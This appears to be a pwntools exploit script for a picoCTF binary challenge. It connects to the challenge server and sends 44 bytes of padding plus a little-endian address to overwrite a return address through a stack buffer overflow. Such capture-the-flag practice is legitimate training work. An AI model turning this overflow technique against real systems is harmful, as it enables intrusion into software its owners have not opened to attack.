from pwn import *

#elf = context.binary = ELF("./vuln")
context.arch = 'amd64'
gs = '''
continue
'''

def start(server=True):
        if(server):
                return remote('saturn.picoctf.net', 51551)
        else:

                return process(['./vuln'])

io = start()

#io.recvuntil(">>")
a = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
a += "\xf6\x91\x04\x08"
io.sendline(a)

io.interactive()